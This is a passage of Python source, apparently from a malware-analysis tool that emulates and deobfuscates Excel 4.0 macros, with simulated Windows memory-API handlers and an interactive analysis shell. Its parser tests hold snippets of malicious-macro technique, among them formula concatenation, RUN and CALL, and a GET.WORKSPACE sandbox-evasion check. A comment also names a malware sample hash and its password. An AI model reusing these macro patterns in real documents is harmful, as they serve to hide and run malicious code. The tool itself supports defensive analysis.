        arg_col_num_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)

        optional_args = True

        if len(arguments) >= 3:
            arg_abs_num_eval_result = self.evaluate_parse_tree(current_cell, arguments[2], interactive)
            if arg_abs_num_eval_result.status == EvalStatus.FullEvaluation:
                abs_num = arg_abs_num_eval_result.value
            else:
                optional_args = False
        else:
            abs_num = 1

        if len(arguments) >= 4:
            arg_a1_eval_result = self.evaluate_parse_tree(current_cell, arguments[3], interactive)
            if arg_a1_eval_result.status == EvalStatus.FullEvaluation:
                a1 = arg_a1_eval_result.value
            else:
                optional_args = False
        else:
            a1 = "TRUE"

        if len(arguments) >= 5:
            arg_sheet_eval_result = self.evaluate_parse_tree(current_cell, arguments[4], interactive)
            if arg_sheet_eval_result.status == EvalStatus.FullEvaluation:
                sheet_name = arg_sheet_eval_result.text.strip('\"')
            else:
                optional_args = False
        else:
            sheet_name = current_cell.sheet.name

        return_val = ''
        if arg_row_num_eval_result.status == EvalStatus.FullEvaluation and \
                arg_col_num_eval_result.status == EvalStatus.FullEvaluation and \
                optional_args:
            return_val += sheet_name + '!'
            if a1 == "FALSE":
                cell_addr_tmpl = 'R{}C{}'
                if abs_num == 2:
                    cell_addr_tmpl = 'R{}C[{}]'
                elif abs_num == 3:
                    cell_addr_tmpl = 'R[{}]C{}'
                elif abs_num == 4:
                    cell_addr_tmpl = 'R[{}]C[{}]'

                return_val += cell_addr_tmpl.format(arg_row_num_eval_result.text,
                                                    arg_col_num_eval_result.text)
            else:
                cell_addr_tmpl = '${}${}'
                if abs_num == 2:
                    cell_addr_tmpl = '{}${}'
                elif abs_num == 3:
                    cell_addr_tmpl = '${}{}'
                elif abs_num == 4:
                    cell_addr_tmpl = '{}{}'

                return_val += cell_addr_tmpl.format(Cell.convert_to_column_name(int(arg_col_num_eval_result.value)),
                                                    arg_row_num_eval_result.text)
            status = EvalStatus.FullEvaluation
        else:
            status = EvalStatus.PartialEvaluation
            return_val = self.evaluate_parse_tree(current_cell, arguments, False)

        return EvalResult(None, status, return_val, str(return_val))

    def indirect_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_addr_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

        status = EvalStatus.PartialEvaluation
        if arg_addr_eval_result.status == EvalStatus.FullEvaluation:
            a1 = "TRUE"
            if len(arguments) == 2:
                arg_a1_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
                if arg_a1_eval_result.status == EvalStatus.FullEvaluation:
                    a1 = arg_a1_eval_result.value

            sheet_name, col, row = Cell.parse_cell_addr(arg_addr_eval_result.value)
            indirect_cell = self.get_cell(sheet_name, col, row)
            return_val = indirect_cell.value
            status = EvalStatus.FullEvaluation
        else:
            return_val = self.evaluate_parse_tree(current_cell, arguments, False)

        return EvalResult(None, status, return_val, str(return_val))

    def register_handler(self, arguments, current_cell, interactive, parse_tree_root):
        if len(arguments) >= 4:
            arg_list = []
            status = EvalStatus.FullEvaluation
            for index, arg in enumerate(arguments):
                if index > 3:
                    break
                res_eval = self.evaluate_parse_tree(current_cell, arg, interactive)
                arg_list.append(res_eval.get_text(unwrap=True))
            function_name = "{}.{}".format(arg_list[0], arg_list[1])
            # signature: https://support.office.com/en-us/article/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f
            function_signature = arg_list[2]
            function_alias = arg_list[3]
            # overrides previously registered function
            self._registered_functions[function_alias] = {'name': function_name, 'signature': function_signature}
            text = self.evaluate_argument_list(current_cell, 'REGISTER', arguments).get_text(unwrap=True)
        else:
            status = EvalStatus.Error
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        return_val = 0

        return EvalResult(None, status, return_val, text)

    def registerid_handler(self, arguments, current_cell, interactive, parse_tree_root):
        if len(arguments) >= 3:
            arg_list = []
            status = EvalStatus.FullEvaluation
            for index, arg in enumerate(arguments):
                if index > 2:
                    break
                res_eval = self.evaluate_parse_tree(current_cell, arg, interactive)
                arg_list.append(res_eval.get_text(unwrap=True))
            function_name = "{}.{}".format(arg_list[0], arg_list[1])
            # signature: https://support.office.com/en-us/article/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f
            function_signature = arg_list[2]
            #function_alias = arg_list[3]
            # overrides previously registered function
            #self._registered_functions[function_alias] = {'name': function_name, 'signature': function_signature}
            text = self.evaluate_argument_list(current_cell, 'REGISTER.ID', arguments).get_text(unwrap=True)
            return_val = function_name
        else:
            status = EvalStatus.Error
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = 0

        return EvalResult(None, status, return_val, text)

    def return_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if self._function_call_stack:
            return_cell = self._function_call_stack.pop()
            return_cell.value = arg1_eval_res.value
            arg1_eval_res.next_cell = self.get_formula_cell(return_cell.sheet,
                                                            return_cell.column,
                                                            str(int(return_cell.row) + 1))
        if arg1_eval_res.text == '':
            arg1_eval_res.text = 'RETURN()'

        return arg1_eval_res

    def fopen_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if len(arguments) > 1:
            arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
            access = arg2_eval_res.value
        else:
            access = '1'

        if arg1_eval_res.status == EvalStatus.FullEvaluation:
            file_name = arg1_eval_res.get_text(unwrap=True)
        else:
            file_name = "default_name"

        if file_name not in self._files:
            self._files[file_name] = {'file_access': access,
                                                            'file_content': ''}
        text = 'FOPEN({},{})'.format(arg1_eval_res.get_text(unwrap=False),
                                     access)
        return EvalResult(None, arg1_eval_res.status, file_name, text)

    def fsize_handler(self, arguments, current_cell, interactive, parse_tree_root, end_line=''):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        file_name = arg1_eval_res.get_text(unwrap=True)
        status = EvalStatus.PartialEvaluation
        return_val = 0
        if file_name in self._files:
            status = EvalStatus.FullEvaluation
            if self._files[file_name]['file_content'] is not None:
                return_val = len(self._files[file_name]['file_content'])
        text = 'FSIZE({})'.format(EvalResult.wrap_str_literal(file_name))
        return EvalResult(None, status, return_val, str(return_val))

    def fwrite_handler(self, arguments, current_cell, interactive, parse_tree_root, end_line=''):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        file_name = arg1_eval_res.value
        if file_name.strip() == "" or EvalResult.is_int(file_name) or EvalResult.is_float(file_name):
            if len(self._files) > 0:
                file_name = list(self._files.keys())[0]
            else:
                file_name = "default_filename"
        file_content = arg2_eval_res.get_text(unwrap=True)
        status = EvalStatus.PartialEvaluation
        if file_name in self._files:
            status = EvalStatus.FullEvaluation
            self._files[file_name]['file_content'] += file_content + end_line
        text = 'FWRITE({},{})'.format(EvalResult.wrap_str_literal(file_name), EvalResult.wrap_str_literal(file_content))
        return EvalResult(None, status, '0', text)

    def fwriteln_handler(self, arguments, current_cell, interactive, parse_tree_root):
        return self.fwrite_handler(arguments, current_cell, interactive, parse_tree_root, end_line='\r\n')

    def files_handler(self, arguments, current_cell, interactive, parse_tree_root, end_line=''):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        dir_name = arg1_eval_res.get_text(unwrap=True)
        status = EvalStatus.FullEvaluation
        # if dir_name in self._files:
        #     return_val = dir_name
        # else:
        #     return_val = None
        return_val = dir_name
        text = "FILES({})".format(EvalResult.wrap_str_literal(dir_name))
        return EvalResult(None, status, return_val, text)

    def iserror_handler(self, arguments, current_cell, interactive, parse_tree_root, end_line=''):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        status = EvalStatus.FullEvaluation

        if arg1_eval_res.value == None:
            return_val = True
        else:
            return_val = False

        if self._iserror_loc is None:
            self._iserror_val = return_val
            self._iserror_loc = current_cell
            self._iserror_count = 1
        elif self._iserror_loc == current_cell:
            if self._iserror_val != return_val:
                self._iserror_val = return_val
                self._iserror_count = 1
            elif self._iserror_count < XLMInterpreter.MAX_ISERROR_LOOPCOUNT:
                self._iserror_count += 1
            else:
                return_val = not return_val
                self._iserror_loc = None

        text = 'ISERROR({})'.format(EvalResult.wrap_str_literal(arg1_eval_res.get_text(unwrap=True)))
        return EvalResult(None, status, return_val, text)

    def offset_handler(self, arguments, current_cell, interactive, parse_tree_root):
        value = 0
        next = None
        status = EvalStatus.PartialEvaluation

        cell = self.get_cell_addr(current_cell, arguments[0])
        row_index = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        col_index = self.evaluate_parse_tree(current_cell, arguments[2], interactive)

        if isinstance(cell, tuple) and \
                row_index.status == EvalStatus.FullEvaluation and \
                col_index.status == EvalStatus.FullEvaluation:
            row = str(int(cell[2]) + int(float(str(row_index.value))))
            col = Cell.convert_to_column_name(Cell.convert_to_column_index(cell[1]) + int(float(str(col_index.value))))
            ref_cell = (cell[0], col, row)
            value = ref_cell
            status = EvalStatus.FullEvaluation
            next = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[cell[0]], col, row)

        text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

        return EvalResult(next, status, value, text)

    def arabic_hander(self, arguments, current_cell, interactive, parse_tree_root, end_line=''):
        arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg1_eval_res.status == EvalStatus.FullEvaluation:
            roman_number = EvalResult.get_text(arg1_eval_res, unwrap=True)
            return_val = roman.fromRoman(roman_number)
            status = EvalStatus.FullEvaluation
            text = str(return_val)
        else:
            return_val = text = self.convert_ptree_to_str(parse_tree_root)
        return EvalResult(None, status, return_val, text)

    def VirtualAlloc_handler(self, arguments, current_cell, interactive, parse_tree_root):
        base_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        size_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        if base_eval_res.status == EvalStatus.FullEvaluation and size_eval_res.status == EvalStatus.FullEvaluation:
            base = int(base_eval_res.get_text(unwrap=True))
            occupied_addresses = [rec['base'] + rec['size'] for rec in self._memory]
            for memory_record in self._memory:
                if memory_record['base'] <= base <= (memory_record['base'] + memory_record['size']):
                    base = map(max, occupied_addresses) + 4096
            size = int(size_eval_res.get_text(unwrap=True))
            self._memory.append({
                'base': base,
                'size': size,
                'data': [0] * size
            })
            return_val = base
            status = EvalStatus.FullEvaluation
        else:
            status = EvalStatus.PartialEvaluation
            return_val = 0

        text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        return EvalResult(None, status, return_val, text)

    def WriteProcessMemory_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        if len(arguments) > 4:
            status = EvalStatus.FullEvaluation
            args_eval_result = []
            for arg in arguments:
                arg_eval_res = self.evaluate_parse_tree(current_cell, arg, interactive)
                if arg_eval_res.status != EvalStatus.FullEvaluation:
                    status = arg_eval_res.status
                args_eval_result.append(arg_eval_res)
            if status == EvalStatus.FullEvaluation:
                base_address = int(args_eval_result[1].value)
                mem_data = args_eval_result[2].value
                mem_data = bytearray([ord(x) for x in mem_data])
                size = int(args_eval_result[3].value)

                if not self.write_memory(base_address, mem_data, size):
                    status = EvalStatus.Error

                text = 'Kernel32.WriteProcessMemory({},{},"{}",{},{})'.format(
                    args_eval_result[0].get_text(),
                    base_address,
                    mem_data.hex(),
                    size,
                    args_eval_result[4].get_text())

                return_val = 0

            if status != EvalStatus.FullEvaluation:
                text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                return_val = 0

            return EvalResult(None, status, return_val, text)

    def RtlCopyMemory_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation

        if len(arguments) == 3:
            destination_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            src_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
            size_res = self.evaluate_parse_tree(current_cell, arguments[2], interactive)
            if destination_eval_res.status == EvalStatus.FullEvaluation and \
                    src_eval_res.status == EvalStatus.FullEvaluation:
                status = EvalStatus.FullEvaluation
                mem_data = src_eval_res.value
                mem_data = bytearray([ord(x) for x in mem_data])
                if not self.write_memory(int(destination_eval_res.value), mem_data, len(mem_data)):
                    status = EvalStatus.Error
                text = 'Kernel32.RtlCopyMemory({},"{}",{})'.format(
                    destination_eval_res.get_text(),
                    mem_data.hex(),
                    size_res.get_text())

        if status == EvalStatus.PartialEvaluation:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

        return_val = 0
        return EvalResult(None, status, return_val, text)

    # endregion

    def write_memory(self, base_address, mem_data, size):
        result = True
        for mem_rec in self._memory:
            if mem_rec['base'] <= base_address <= mem_rec['base'] + mem_rec['size']:
                if mem_rec['base'] <= base_address + size <= mem_rec['base'] + mem_rec['size']:
                    offset = base_address - mem_rec['base']
                    for i in range(0, size):
                        mem_rec['data'][offset + i] = mem_data[i]
                else:
                    result = False
                break
        return result

    def evaluate_defined_name(self, current_cell, name, interactive):
        result = None
        lname = name.lower()
        if lname in self.defined_names:
            val = self.defined_names[lname]
            if isinstance(val, Tree) and val.data == 'cell':
                eval_res = self.evaluate_cell(current_cell, interactive, val)
                result = eval_res.value
            elif isinstance(val, list):
                result = val
            else:

                if isinstance(val, Cell):
                    data = val.value
                else:
                    # example: c7e40628fb6beb52d9d73a3b3afd1dca5d2335713593b698637e1a47b42bfc71  password: 2021
                    data = val
                try:
                    formula_str = str(data) if str(data).startswith('=') else '=' + str(data)
                    parsed_formula = self.xlm_parser.parse(formula_str)
                    eval_result = self.evaluate_parse_tree(current_cell, parsed_formula, interactive)
                    if isinstance(eval_result.value, list):
                        result = eval_result.value
                    else:
                        result = str(eval_result.value)
                except:
                    result = str(data)

        return result

    def evaluate_parse_tree(self, current_cell, parse_tree_root, interactive=True):
        next_cell = None
        status = EvalStatus.NotImplemented
        text = None
        return_val = None

        if type(parse_tree_root) is Token:
            if parse_tree_root.value.lower() in self.defined_names:
                # this formula has a defined name that can be changed
                # current formula must be removed from cache
                self._remove_current_formula_from_cache = True
                parse_tree_root.value = self.evaluate_defined_name(current_cell, parse_tree_root.value, interactive)

            return_val = parse_tree_root.value
            status = EvalStatus.FullEvaluation
            text = str(return_val)
            result = EvalResult(next_cell, status, return_val, text)

        elif type(parse_tree_root) is list:
            return_val = text = ''
            status = EvalStatus.FullEvaluation
            result = EvalResult(next_cell, status, return_val, text)

        elif parse_tree_root.data == 'function_call':
            result = self.evaluate_function(current_cell, parse_tree_root, interactive)

        elif parse_tree_root.data == 'cell':
            result = self.evaluate_cell(current_cell, interactive, parse_tree_root)

        elif parse_tree_root.data == 'range':
            result = self.evaluate_range(current_cell, interactive, parse_tree_root)

        elif parse_tree_root.data == 'array':
            result = self.evaluate_array(current_cell, interactive, parse_tree_root)

        elif parse_tree_root.data in self._expr_rule_names:
            text_left = None
            concat_status = EvalStatus.FullEvaluation
            for index, child in enumerate(parse_tree_root.children):
                if type(child) is Token and child.type in ['ADDITIVEOP', 'MULTIOP', 'CMPOP', 'CONCATOP']:

                    op_str = str(child)
                    right_arg = parse_tree_root.children[index + 1]
                    right_arg_eval_res = self.evaluate_parse_tree(current_cell, right_arg, interactive)
                    if isinstance(right_arg_eval_res.value, Cell):
                        text_right = EvalResult.unwrap_str_literal(right_arg_eval_res.value.value)
                    else:
                        text_right = right_arg_eval_res.get_text(unwrap=True)

                    if op_str == '&':
                        if left_arg_eval_res.status == EvalStatus.FullEvaluation and right_arg_eval_res.status != EvalStatus.FullEvaluation:
                            text_left = '{}&{}'.format(text_left, text_right)
                            left_arg_eval_res.status = EvalStatus.PartialEvaluation
                            concat_status = EvalStatus.PartialEvaluation
                        elif left_arg_eval_res.status != EvalStatus.FullEvaluation and right_arg_eval_res.status == EvalStatus.FullEvaluation:
                            text_left = '{}&{}'.format(text_left, text_right)
                            left_arg_eval_res.status = EvalStatus.FullEvaluation
                            concat_status = EvalStatus.PartialEvaluation
                        elif left_arg_eval_res.status != EvalStatus.FullEvaluation and right_arg_eval_res.status != EvalStatus.FullEvaluation:
                            text_left = '{}&{}'.format(text_left, text_right)
                            left_arg_eval_res.status = EvalStatus.PartialEvaluation
                            concat_status = EvalStatus.PartialEvaluation
                        else:
                            text_left = text_left + text_right
                    elif left_arg_eval_res.status == EvalStatus.FullEvaluation and right_arg_eval_res.status == EvalStatus.FullEvaluation:
                        status = EvalStatus.FullEvaluation
                        if isinstance(right_arg_eval_res.value, Cell):
                            value_right = right_arg_eval_res.value.value
                        else:
                            value_right = right_arg_eval_res.value
                            if isinstance(value_right, str):
                                if value_right.lower() == 'true':
                                    value_right = 1
                                elif value_right.lower() == 'false':
                                    value_right = 0

                        text_left = str(text_left)
                        text_right = str(text_right)

                        if text_left == '':
                            text_left = '0'
                            value_left = 0

                        if text_right == '':
                            text_right = '0'
                            value_right = 0

                        if self.is_float(value_left) and self.is_float(value_right):
                            if op_str in self._operators:
                                op_res = self._operators[op_str](float(value_left), float(value_right))
                                if type(op_res) == bool:
                                    value_left = str(op_res)
                                elif op_res.is_integer():
                                    value_left = str(int(op_res))
                                else:
                                    op_res = round(op_res, 10)
                                    value_left = str(op_res)
                            else:
                                value_left = 'Operator ' + op_str
                                left_arg_eval_res.status = EvalStatus.NotImplemented
                        elif EvalResult.is_datetime(text_left.strip('\"')) and EvalResult.is_datetime(text_right.strip('\"')):
                            timestamp1 = datetime.datetime.strptime(text_left.strip('\"'), "%Y-%m-%d %H:%M:%S.%f")
                            timestamp2 = datetime.datetime.strptime(text_right.strip('\"'), "%Y-%m-%d %H:%M:%S.%f")
                            op_res = self._operators[op_str](float(timestamp1.timestamp()),
                                                             float(timestamp2.timestamp()))
                            op_res += 1000
                            if type(op_res) == bool:
                                value_left = str(op_res)
                            elif EvalResult.is_datetime(op_res):
                                value_left = str(op_res)
                            elif op_res.is_integer():
                                value_left = str(op_res)
                            else:
                                op_res = round(op_res, 10)
                                value_left = str(op_res)
                        elif EvalResult.is_datetime(text_left.strip('\"')) and EvalResult.is_time(text_right.strip('\"')):
                            timestamp1 = datetime.datetime.strptime(text_left.strip('\"'), "%Y-%m-%d %H:%M:%S.%f")
                            timestamp2 = datetime.datetime.strptime(text_right.strip('\"'), "%H:%M:%S")
                            t1 = float(timestamp1.timestamp())
                            t2 = float(
                                int(timestamp2.hour) * 3600 + int(timestamp2.minute) * 60 + int(timestamp2.second))
                            op_res = datetime.datetime.fromtimestamp(self._operators[op_str](t1, t2))
                            if type(op_res) == bool:
                                value_left = str(op_res)
                            elif type(op_res) == datetime.datetime:
                                value_left = str(op_res)
                            elif op_res.is_integer():
                                value_left = str(op_res)
                            else:
                                op_res = round(op_res, 10)
                                value_left = str(op_res)
                        else:
                            if op_str in self._operators:
                                value_left = EvalResult.unwrap_str_literal(str(value_left))
                                value_right = EvalResult.unwrap_str_literal(str(value_right))
                                op_res = self._operators[op_str](value_left, value_right)
                                value_left = op_res
                            else:
                                value_left = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                                left_arg_eval_res.status = EvalStatus.PartialEvaluation
                        text_left = value_left
                    else:
                        left_arg_eval_res.status = EvalStatus.PartialEvaluation
                        text_left = '{}{}{}'.format(text_left, op_str, text_right)
                    return_val = text_left
                else:
                    if text_left is None:
                        left_arg = parse_tree_root.children[index]
                        left_arg_eval_res = self.evaluate_parse_tree(current_cell, left_arg, interactive)
                        text_left = left_arg_eval_res.get_text(unwrap=True)
                        if isinstance(left_arg_eval_res.value, Cell):
                            value_left = left_arg_eval_res.value.value
                        else:
                            value_left = left_arg_eval_res.value
                            if isinstance(value_left, str):
                                if value_left.lower() == 'true':
                                    value_left = 1
                                elif value_left.lower() == 'false':
                                    value_left = 0

            if concat_status == EvalStatus.PartialEvaluation and left_arg_eval_res.status == EvalStatus.FullEvaluation:
                left_arg_eval_res.status = concat_status
            result = EvalResult(next_cell, left_arg_eval_res.status, return_val, EvalResult.wrap_str_literal(text_left))
        elif parse_tree_root.data == 'final':
            arg = parse_tree_root.children[1]
            result = self.evaluate_parse_tree(current_cell, arg, interactive)

        else:
            status = EvalStatus.FullEvaluation
            for child_node in parse_tree_root.children:
                if child_node is not None:
                    child_eval_result = self.evaluate_parse_tree(current_cell, child_node, interactive)
                    if child_eval_result.status != EvalStatus.FullEvaluation:
                        status = child_eval_result.status

            result = EvalResult(child_eval_result.next_cell, status, child_eval_result.value, child_eval_result.text)
            result.output_level = child_eval_result.output_level

        return result

    def evaluate_cell(self, current_cell, interactive, parse_tree_root):
        sheet_name, col, row = self.get_cell_addr(current_cell, parse_tree_root)
        return_val = ''
        text = ''
        status = EvalStatus.PartialEvaluation

        if sheet_name is not None:
            cell_addr = col + str(row)

            if sheet_name in self.xlm_wrapper.get_macrosheets():
                sheet = self.xlm_wrapper.get_macrosheets()[sheet_name]
            else:
                sheet = self.xlm_wrapper.get_worksheets()[sheet_name]

            if cell_addr not in sheet.cells and (sheet_name, cell_addr) in self.cell_with_unsuccessfull_set:
                if interactive:
                    self.invoke_interpreter = True
                    if self.first_unknown_cell is None:
                        self.first_unknown_cell = cell_addr

            if cell_addr in sheet.cells:
                cell = sheet.cells[cell_addr]

                if cell.formula is not None and cell.formula != cell.value:
                    try:
                        parse_tree = self.xlm_parser.parse(cell.formula)
                        eval_result = self.evaluate_parse_tree(cell, parse_tree, False)
                        return_val = eval_result.value
                        text = eval_result.get_text()
                        status = eval_result.status
                    except:
                        return_val = cell.formula
                        text = EvalResult.wrap_str_literal(cell.formula)
                        status = EvalStatus.FullEvaluation

                elif cell.value is not None:
                    text = EvalResult.wrap_str_literal(cell.value, must_wrap=True)
                    return_val = text
                    status = EvalStatus.FullEvaluation
                else:
                    text = "{}".format(cell_addr)
            else:
                if (sheet_name, cell_addr) in self.cell_with_unsuccessfull_set:
                    text = "{}".format(cell_addr)
                else:
                    text = ''
                    status = EvalStatus.FullEvaluation
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)

        return EvalResult(None, status, return_val, text)

    def evaluate_range(self, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        if len(parse_tree_root.children) >= 3:
            start_address = self.get_cell_addr(current_cell, parse_tree_root.children[0])
            end_address = self.get_cell_addr(current_cell, parse_tree_root.children[2])
            selected = None
            if len(parse_tree_root.children) == 5:
                selected = self.get_cell_addr(current_cell, parse_tree_root.children[4])
            self.selected_range = (start_address, end_address, selected)
            status = EvalStatus.FullEvaluation
        text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
        return_val = text

        return EvalResult(None, status, return_val, text)

    def evaluate_array(self, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        array_elements = []
        for index, array_elm in enumerate(parse_tree_root.children):
            # skip semicolon (;)
            if index % 2 == 1:
                continue
            if array_elm.type == 'NUMBER':
                array_elements.append(float(array_elm))
            else:
                array_elements.append(str(array_elm))
        text = str(array_elements)
        return_val = array_elements

        return EvalResult(None, status, return_val, text)

    def interactive_shell(self, current_cell, message):
        print('\nProcess Interruption:')
        print('CELL:{:10}{}'.format(current_cell.get_local_address(), current_cell.formula))
        print(message)
        print('Enter XLM macro:')
        print('Tip: CLOSE() or HALT() to exist')

        while True:
            line = input()
            line = '=' + line.strip()
            if line:
                try:
                    parse_tree = self.xlm_parser.parse(line)
                    ret_result = self.evaluate_parse_tree(current_cell, parse_tree, interactive=False)
                    print(ret_result.value)
                    if ret_result.status == EvalStatus.End:
                        break
                except ParseError as exp:
                    print("Invalid XLM macro")
                except Exception:
                    sys.exit()
            else:
                break

    def has_loop(self, path, length=10):
        if len(path) < length * 2:
            return False
        else:
            result = False
            start_index = len(path) - length

            for j in range(0, start_index - length):
                matched = True
                k = j
                while start_index + k - j < len(path):
                    if path[k] != path[start_index + k - j]:
                        matched = False
                        break
                    k += 1
                if matched:
                    result = True
                    break
            return result

    regex_string = r'\"([^\"]|\"\")*\"'
    detect_string = re.compile(regex_string, flags=re.MULTILINE)

    def extract_strings(self, string):
        result = []
        matches = XLMInterpreter.detect_string.finditer(string)
        for matchNum, match in enumerate(matches, start=1):
            result.append(match.string[match.start(0):match.end(0)])
        return result

    def deobfuscate_macro(self, interactive, start_point="", timeout=0, silent_mode=False):
        result = []
        self._start_timestamp = time.time()

        self.auto_labels = self.xlm_wrapper.get_defined_name('auto_open', full_match=False)
        self.auto_labels.extend(self.xlm_wrapper.get_defined_name('auto_close', full_match=False))

        if len(self.auto_labels) == 0:
            if len(start_point) > 0:
                self.auto_labels = [('auto_open', start_point)]
            elif interactive:
                print('There is no entry point, please specify a cell address to start')
                print('Example: Sheet1!A1')
                self.auto_labels = [('auto_open', input().strip())]

        if self.auto_labels is not None and len(self.auto_labels) > 0:
            macros = self.xlm_wrapper.get_macrosheets()

            continue_emulation = True
            for auto_open_label in self.auto_labels:
                if not continue_emulation:
                    break
                try:
                    sheet_name, col, row = Cell.parse_cell_addr(auto_open_label[1])
                    if sheet_name in macros:
                        current_cell = self.get_formula_cell(macros[sheet_name], col, row)
                        self._branch_stack = [(current_cell, current_cell.formula, macros[sheet_name].cells, 0, '')]
                        observed_cells = []
                        while len(self._branch_stack) > 0:
                            if not continue_emulation:
                                break
                            current_cell, formula, saved_cells, indent_level, desc = self._branch_stack.pop()
                            macros[current_cell.sheet.name].cells = saved_cells
                            self._indent_level = indent_level
                            stack_record = True
                            while current_cell is not None:
                                if not continue_emulation:
                                    break
                                if type(formula) is str:
                                    replace_op = getattr(self.xlm_wrapper, "replace_nonprintable_chars", None)
                                    if callable(replace_op):
                                        formula = replace_op(formula, '_')
                                    if formula not in self._formula_cache:
                                        parse_tree = self.xlm_parser.parse(formula)
                                        self._formula_cache[formula] = parse_tree
                                    else:
                                        parse_tree = self._formula_cache[formula]
                                else:
                                    parse_tree = formula

                                if stack_record:
                                    previous_indent = self._indent_level - 1 if self._indent_level > 0 else 0
                                else:
                                    previous_indent = self._indent_level

                                evaluation_result = self.evaluate_parse_tree(current_cell, parse_tree, interactive)

                                if self._remove_current_formula_from_cache:
                                    self._remove_current_formula_from_cache = False
                                    if formula in self._formula_cache:
                                        del (self._formula_cache[formula])

                                if len(self._while_stack) == 0 and evaluation_result.text != 'NEXT':
                                    observed_cells.append(current_cell.get_local_address())

                                    if self.has_loop(observed_cells):
                                        break

                                if self.invoke_interpreter and interactive:
                                    self.interactive_shell(
                                        current_cell,
                                        'Partial Eval: {}\r\n{} is not populated, what should be its value?'.format(
                                            evaluation_result.text, self.first_unknown_cell))
                                    self.invoke_interpreter = False
                                    self.first_unknown_cell = None
                                    continue

                                if evaluation_result.value is not None:
                                    current_cell.value = str(evaluation_result.value)

                                if evaluation_result.next_cell is None and \
                                        (evaluation_result.status == EvalStatus.FullEvaluation or
                                         evaluation_result.status == EvalStatus.PartialEvaluation or
                                         evaluation_result.status == EvalStatus.NotImplemented or
                                         evaluation_result.status == EvalStatus.IGNORED):
                                    evaluation_result.next_cell = self.get_formula_cell(current_cell.sheet,
                                                                                        current_cell.column,
                                                                                        str(int(current_cell.row) + 1))
                                if stack_record:
                                    evaluation_result.text = (
                                        desc + ' ' + evaluation_result.get_text(unwrap=False)).strip()

                                if self._indent_current_line:
                                    previous_indent = self._indent_level
                                    self._indent_current_line = False

                                if evaluation_result.status != EvalStatus.IGNORED:
                                    if self.output_level >= 3 and evaluation_result.output_level == 2:
                                        strings = self.extract_strings(evaluation_result.get_text(unwrap=True))
                                        if strings:
                                            yield (
                                                current_cell, evaluation_result.status,
                                                '\n'.join(strings),
                                                previous_indent)
                                    elif evaluation_result.output_level >= self.output_level:
                                        yield (
                                            current_cell, evaluation_result.status,
                                            evaluation_result.get_text(unwrap=False),
                                            previous_indent)

                                if timeout > 0 and time.time() - self._start_timestamp > timeout:
                                    continue_emulation = False

                                if evaluation_result.next_cell is not None:
                                    current_cell = evaluation_result.next_cell
                                else:
                                    break
                                formula = current_cell.formula
                                stack_record = False
                except Exception as exp:
                    exc_type, exc_obj, traceback = sys.exc_info()
                    frame = traceback.tb_frame
                    lineno = traceback.tb_lineno
                    filename = frame.f_code.co_filename
                    linecache.checkcache(filename)
                    line = linecache.getline(filename, lineno, frame.f_globals)
                    uprint('Error [{}:{} {}]: {}'.format(os.path.basename(filename),
                                                         lineno,
                                                         line.strip(),
                                                         exc_obj),
                           silent_mode=silent_mode)


def test_parser():
    grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro-en.lark')
    macro_grammar = open(grammar_file_path, 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar, parser='lalr')

    print("\n={12,13,14}")
    print(xlm_parser.parse("={12;13;14}"))
    print("\n=171*GET.CELL(19,A81)")
    print(xlm_parser.parse("=171*GET.CELL(19,A81)"))
    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
